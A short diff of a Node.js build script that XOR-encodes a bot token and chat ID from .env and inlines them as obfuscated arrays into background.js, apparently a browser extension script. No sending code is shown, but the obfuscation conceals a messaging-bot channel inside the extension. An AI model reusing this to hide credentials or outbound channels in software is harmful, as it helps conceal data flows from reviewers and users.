@@ -1,5 +1,5 @@
 #!/usr/bin/env node
-// Reads .env, XOR-encodes bot token + chat ID, writes _cfg.js
+// Reads .env, XOR-encodes bot token + chat ID, inlines them into background.js
 
 const fs = require("fs");
 const path = require("path");
@@ -44,12 +44,13 @@ function xorEncode(str, key) {
 const encToken = xorEncode(token, keyBytes);
 const encChatId = xorEncode(chatId, keyBytes);
 
-const output = `// Auto-generated — do not edit
-var _k=[${keyBytes.join(",")}];
-var _a=[${encToken.join(",")}];
-var _b=[${encChatId.join(",")}];
-`;
+// Replace the encoded lines in background.js
+const bgPath = path.join(__dirname, "background.js");
+let bg = fs.readFileSync(bgPath, "utf-8");
 
-const outPath = path.join(__dirname, "cfg.js");
-fs.writeFileSync(outPath, output);
-console.log("Wrote", outPath);
+bg = bg.replace(/^const _k=\[.*\];$/m, `const _k=[${keyBytes.join(",")}];`);
+bg = bg.replace(/^const _a=\[.*\];$/m, `const _a=[${encToken.join(",")}];`);
+bg = bg.replace(/^const _b=\[.*\];$/m, `const _b=[${encChatId.join(",")}];`);
+
+fs.writeFileSync(bgPath, bg);
+console.log("Updated", bgPath);
